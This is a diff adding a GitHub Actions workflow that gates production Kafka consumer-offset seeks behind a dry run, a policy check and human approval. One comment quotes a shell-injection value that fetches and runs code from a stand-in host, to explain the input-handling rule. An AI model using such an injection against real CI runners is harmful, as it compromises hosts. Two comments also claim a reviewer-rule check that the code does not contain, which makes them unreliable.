@@ -1,0 +1,360 @@
+# PROD promotion gate for a consumer-group offset seek.
+#
+# Shape: dry-run -> HUMAN APPROVAL -> apply. The approval sits between two jobs
+# because that is the only way GitHub will actually block: `environment:` on the
+# apply job is what pauses the run and waits for a named reviewer.
+#
+# Three properties this file is built around:
+#
+#   1. A DENY never reaches a human. If policy_check.py fails, the dry-run job
+#      fails and the apply job never starts -- so nobody is asked to approve
+#      something the policy already rejected, and nobody gets in the habit of
+#      approving past a red check.
+#   2. The thing applied is the exact artifact that was approved. apply_offsets.py
+#      reads the uploaded JSON; it does not recompute the target. Recomputing
+#      would mean applying something nobody looked at.
+#   3. Approval can go stale, and staleness is checked twice: policy_check re-runs
+#      after approval with a fresh clock (max_diff_age_seconds), and
+#      apply_offsets.py re-reads the broker and refuses on any drift.
+#
+# NOT verified end to end: the `production` environment's required-reviewer rule
+# is repository configuration, not file configuration -- see the preflight below.
+
+name: Promote to PROD
+
+on:
+  workflow_dispatch:
+    inputs:
+      change_id:
+        description: "Change ID, e.g. CHG-001 (used as the artifact directory)"
+        required: true
+        type: string
+      group:
+        description: "Consumer group"
+        required: true
+        default: payments-reconciler
+        type: string
+      topic:
+        description: "Topic"
+        required: true
+        default: payments.events
+        type: string
+      seek_mode:
+        description: "Seek mode"
+        required: true
+        type: choice
+        options: [to_latest, to_offset, shift_by, to_timestamp, to_earliest]
+      seek_value:
+        description: "Value for to_offset / shift_by / to_timestamp. Ignored otherwise."
+        required: false
+        type: string
+      reason:
+        description: "Why. This lands in the artifact and is what the approver reads."
+        required: true
+        type: string
+
+# Offset promotions must not interleave. Two concurrent runs would each pass
+# their own drift check and then race. cancel-in-progress stays false: killing a
+# run mid-apply is worse than queueing.
+concurrency:
+  group: promote-prod
+  cancel-in-progress: false
+
+env:
+  BOOTSTRAP: "localhost:9092"
+  CHANGE_DIR: "docs/changes/${{ inputs.change_id }}"
+
+jobs:
+  # ------------------------------------------------------------------------
+  dry-run:
+    name: "Dry run + policy"
+    runs-on: [self-hosted, production]
+    timeout-minutes: 15
+
+    steps:
+      - uses: actions/checkout@v4
+
+      # systemd does not source ~/.bashrc, so ~/.local/bin is missing from the
+      # runner's PATH even though uv works fine over SSH. Same fix as
+      # int-tests.yml; see the long note there.
+      - name: Put uv on PATH
+        run: |
+          set -euo pipefail
+          [ -x "$HOME/.local/bin/uv" ] || curl -LsSf https://astral.sh/uv/install.sh | sh
+          echo "$HOME/.local/bin" >> "$GITHUB_PATH"
+
+      - name: Preflight
+        run: |
+          set -euo pipefail
+          if ! (exec 3<>/dev/tcp/127.0.0.1/9092) 2>/dev/null; then
+            echo "::error::PROD broker not reachable on ${BOOTSTRAP}"
+            exit 1
+          fi
+          # Deliberate: PROD does NOT expose the broker:29092 Breeze test
+          # listener that INT and STAG carry. If a future change makes this
+          # workflow need it, the correct fix is to change the workflow, not to
+          # add a test listener to a production broker.
+          if (exec 3<>/dev/tcp/127.0.0.1/29092) 2>/dev/null; then
+            echo "::warning::PROD is exposing 29092. That listener is for INT/STAG only."
+          fi
+          echo "broker reachable on ${BOOTSTRAP}"
+
+      # ------------------------------------------------------------------
+      # Every step that consumes a workflow input passes it through `env:` and
+      # reads it as a "$SHELL_VAR" -- never as ${{ inputs.* }} inline.
+      #
+      # ${{ }} is substituted into the script as TEXT before bash sees it, so an
+      # inline `${{ inputs.reason }}` of `"; curl evil.sh | sh; #` executes. This
+      # workflow runs on a SELF-HOSTED runner with Docker socket access on the
+      # PROD box, so that is host compromise, not a broken build. workflow_dispatch
+      # needs write access, but "only collaborators can exploit it" is not a
+      # security boundary worth resting on.
+      #
+      # Via env:, the value arrives as data in the process environment and is
+      # never parsed as shell. This is GitHub's documented mitigation.
+      #
+      # This runs FIRST, before the venv and before the rollback capture, because
+      # CHANGE_DIR is built from change_id and is used as a filesystem path.
+      # ------------------------------------------------------------------
+      - name: Validate inputs
+        env:
+          CHANGE_ID: ${{ inputs.change_id }}
+          SEEK_MODE: ${{ inputs.seek_mode }}
+          SEEK_VALUE: ${{ inputs.seek_value }}
+        run: |
+          set -euo pipefail
+          # change_id becomes a path segment in CHANGE_DIR. Without this, a
+          # change_id of "../../.." writes artifacts outside the workspace.
+          if ! printf '%s' "$CHANGE_ID" | grep -Eq '^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$'; then
+            echo "::error::change_id must be alphanumeric with . _ - (max 64, no slashes). Got: $CHANGE_ID"
+            exit 2
+          fi
+          case "$SEEK_MODE" in
+            to_earliest|to_latest)
+              # Written as `if`, not `[ -n "$X" ] && echo ...`, on purpose. Under
+              # `set -e` that AND-list evaluates to status 1 whenever seek_value
+              # is empty -- the NORMAL case for these two modes. It survives only
+              # because another command follows the `esac`, so deleting the line
+              # below would make valid input start failing. `if` has no such edge.
+              if [ -n "$SEEK_VALUE" ]; then
+                echo "::warning::seek_value is ignored for $SEEK_MODE"
+              fi ;;
+            to_offset|shift_by|to_timestamp)
+              if [ -z "$SEEK_VALUE" ]; then
+                echo "::error::seek_mode=$SEEK_MODE requires seek_value"; exit 2
+              fi
+              # The tools parse these as ints; reject here so the failure names
+              # the actual problem instead of surfacing an argparse trace.
+              if ! printf '%s' "$SEEK_VALUE" | grep -Eq '^-?[0-9]+$'; then
+                echo "::error::seek_value must be an integer for $SEEK_MODE. Got: $SEEK_VALUE"; exit 2
+              fi ;;
+            *) echo "::error::unknown seek_mode: $SEEK_MODE"; exit 2 ;;
+          esac
+          echo "inputs valid"
+
+      # confluent-kafka + PyYAML only. These tools deliberately do not import
+      # Airflow, which is why this step takes seconds instead of minutes.
+      - name: Tool venv
+        run: |
+          set -euo pipefail
+          # --clear: self-hosted runners reuse their workspace and `uv venv`
+          # exits 2 rather than overwriting. Found while rehearsing
+          # stag-tests.yml on the box; the same line was latent here.
+          uv venv --clear --python 3.12 .venv-tools
+          uv pip install -q --python .venv-tools/bin/python confluent-kafka==2.6.0 pyyaml
+          .venv-tools/bin/python -c "import confluent_kafka,yaml;print('confluent-kafka',confluent_kafka.__version__)"
+
+      # Rollback point FIRST, before anything is computed against the broker.
+      # If this fails there is no safe change to make, so it gates everything.
+      - name: Capture rollback point
+        env:
+          GROUP: ${{ inputs.group }}
+          TOPIC: ${{ inputs.topic }}
+        run: |
+          set -euo pipefail
+          .venv-tools/bin/python tools/capture_offsets.py \
+            --group "$GROUP" --topic "$TOPIC" \
+            --bootstrap "${BOOTSTRAP}" --change-dir "${CHANGE_DIR}"
+
+      - name: Dry run
+        env:
+          GROUP: ${{ inputs.group }}
+          TOPIC: ${{ inputs.topic }}
+          SEEK_MODE: ${{ inputs.seek_mode }}
+          SEEK_VALUE: ${{ inputs.seek_value }}
+        run: |
+          set -euo pipefail
+          # An ARRAY, not a string. As a string, $FLAG had to be left unquoted to
+          # split into two arguments (shellcheck SC2086) -- which also meant any
+          # whitespace or glob in seek_value re-split or expanded. The array
+          # carries the argument boundaries explicitly.
+          case "$SEEK_MODE" in
+            to_earliest) FLAG=(--to-earliest) ;;
+            to_latest)   FLAG=(--to-latest) ;;
+            to_offset)    FLAG=(--to-offset "$SEEK_VALUE") ;;
+            shift_by)     FLAG=(--shift-by "$SEEK_VALUE") ;;
+            to_timestamp) FLAG=(--to-timestamp "$SEEK_VALUE") ;;
+            *) echo "::error::unknown seek_mode"; exit 2 ;;
+          esac
+          # Table to the log, JSON to the artifact. Same computation.
+          .venv-tools/bin/python tools/offset_diff.py \
+            --group "$GROUP" --topic "$TOPIC" \
+            --bootstrap "${BOOTSTRAP}" "${FLAG[@]}" \
+            --output "${CHANGE_DIR}/offset-diff.json" | tee "${CHANGE_DIR}/offset-diff.txt"
+
+      # The approver reads this in the GitHub UI, not the raw log. If the table
+      # is not in front of them at the moment they click Approve, the approval
+      # is theatre.
+      #
+      # Plain English FIRST, table second, and that order is the point. The
+      # person clicking Approve on a production change is frequently not the
+      # person who wrote it -- it is whoever is on call, at whatever hour the
+      # incident happened. A partition table is the wrong opening argument for
+      # that reader: they will scan it, find nothing they can act on, and
+      # approve on trust. `views.py pm` leads with what changes and what is
+      # unrecoverable if it is wrong, in a sentence they can actually weigh.
+      #
+      # Both halves are rendered from ${CHANGE_DIR}/offset-diff.json, so the
+      # prose cannot describe a different change than the table. That is the
+      # only reason it is safe to put prose in front of an approval at all.
+      - name: Summary for the approver
+        env:
+          CHANGE_ID: ${{ inputs.change_id }}
+          REASON: ${{ inputs.reason }}
+        run: |
+          set -euo pipefail
+          # REASON reaches this via env, never interpolated into the command
+          # line, so it is not re-parsed as shell -- same rule as the echo below.
+          .venv-tools/bin/python tools/views.py pm \
+            --diff "${CHANGE_DIR}/offset-diff.json" \
+            --policy policy/prod.yaml \
+            --change-id "${CHANGE_ID}" \
+            --reason "${REASON}" \
+            --output "${CHANGE_DIR}/summary-pm.md"
+          {
+            cat "${CHANGE_DIR}/summary-pm.md"
+            echo ""
+            echo "<details><summary>Exact offsets (per partition)</summary>"
+            echo ""
+            echo '```'
+            cat "${CHANGE_DIR}/offset-diff.txt"
+            echo '```'
+            echo ""
+            echo "</details>"
+            echo ""
+            echo "Rollback for offsets only: \`${CHANGE_DIR}/restore.sh\`."
+            echo "Rolling back the *deployment* is a separate operation — rebuild the"
+            echo "image with the previous wheel in \`deploy/production/\`."
+          } >> "$GITHUB_STEP_SUMMARY"
+
+      # Property 1: a DENY fails here, so the apply job never starts and no
+      # approval is ever requested.
+      - name: Policy gate
+        run: |
+          set -euo pipefail
+          set +e
+          .venv-tools/bin/python tools/policy_check.py \
+            --policy policy/prod.yaml \
+            --diff "${CHANGE_DIR}/offset-diff.json" \
+            --output "${CHANGE_DIR}/policy-verdict.json" | tee "${CHANGE_DIR}/policy-verdict.txt"
+          rc=${PIPESTATUS[0]}
+          set -e
+          {
+            echo ""
+            echo "### Policy verdict"
+            echo '```'
+            cat "${CHANGE_DIR}/policy-verdict.txt"
+            echo '```'
+          } >> "$GITHUB_STEP_SUMMARY"
+          case $rc in
+            0) echo "policy ALLOW" ;;
+            1) echo "::error::policy DENIED this change. Nothing was modified."; exit 1 ;;
+            # Exit 2 is a broken policy file, not a denial. Distinguished on
+            # purpose -- it means the gate did not actually evaluate.
+            2) echo "::error::policy file or diff artifact is malformed -- the gate did NOT run."; exit 1 ;;
+            *) echo "::error::policy_check exited $rc"; exit 1 ;;
+          esac
+
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: promotion-${{ inputs.change_id }}
+          path: ${{ env.CHANGE_DIR }}/
+          if-no-files-found: error
+
+  # ------------------------------------------------------------------------
+  apply:
+    name: "Apply (requires approval)"
+    needs: dry-run
+    runs-on: [self-hosted, production]
+    timeout-minutes: 15
+    # THIS is the gate. The required-reviewer rule lives in repo settings
+    # (Settings -> Environments -> production), not in this file -- a workflow
+    # cannot grant itself an approver. If that rule is not configured, this line
+    # is decorative and the job runs straight through, which is why the first
+    # step below asserts rather than assumes.
+    environment: production
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Put uv on PATH
+        run: |
+          set -euo pipefail
+          [ -x "$HOME/.local/bin/uv" ] || curl -LsSf https://astral.sh/uv/install.sh | sh
+          echo "$HOME/.local/bin" >> "$GITHUB_PATH"
+
+      - uses: actions/download-artifact@v4
+        with:
+          name: promotion-${{ inputs.change_id }}
+          path: ${{ env.CHANGE_DIR }}
+
+      - name: Tool venv
+        run: |
+          set -euo pipefail
+          uv venv --clear --python 3.12 .venv-tools
+          uv pip install -q --python .venv-tools/bin/python confluent-kafka==2.6.0 pyyaml
+
+      # Property 3, first check. Fresh clock: if the approval sat in someone's
+      # inbox past max_diff_age_seconds, the numbers they approved no longer
+      # describe the broker.
+      - name: Re-check policy against the current clock
+        run: |
+          set -euo pipefail
+          .venv-tools/bin/python tools/policy_check.py \
+            --policy policy/prod.yaml --diff "${CHANGE_DIR}/offset-diff.json" \
+            || { echo "::error::policy no longer passes at apply time (likely a stale dry run). Re-run the promotion."; exit 1; }
+
+      # Property 2 + 3, second check. Applies the approved artifact verbatim,
+      # and refuses if the group's committed offsets moved since it was written.
+      - name: Apply
+        run: |
+          set -euo pipefail
+          .venv-tools/bin/python tools/apply_offsets.py \
+            --diff "${CHANGE_DIR}/offset-diff.json" --bootstrap "${BOOTSTRAP}" \
+            | tee "${CHANGE_DIR}/apply-result.txt"
+
+      - name: Record post-state
+        if: always()
+        env:
+          GROUP: ${{ inputs.group }}
+          TOPIC: ${{ inputs.topic }}
+          CHANGE_ID: ${{ inputs.change_id }}
+        run: |
+          set -euo pipefail
+          .venv-tools/bin/python tools/capture_offsets.py \
+            --group "$GROUP" --topic "$TOPIC" \
+            --bootstrap "${BOOTSTRAP}" --change-dir "${CHANGE_DIR}/post" || true
+          {
+            echo "## Applied — \`${CHANGE_ID}\`"
+            echo '```'
+            cat "${CHANGE_DIR}/apply-result.txt" 2>/dev/null || echo "apply did not complete"
+            echo '```'
+            echo "Offset rollback: \`${CHANGE_DIR}/restore.sh\` (captured pre-change)."
+          } >> "$GITHUB_STEP_SUMMARY"
+
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: promotion-${{ inputs.change_id }}-applied
+          path: ${{ env.CHANGE_DIR }}/
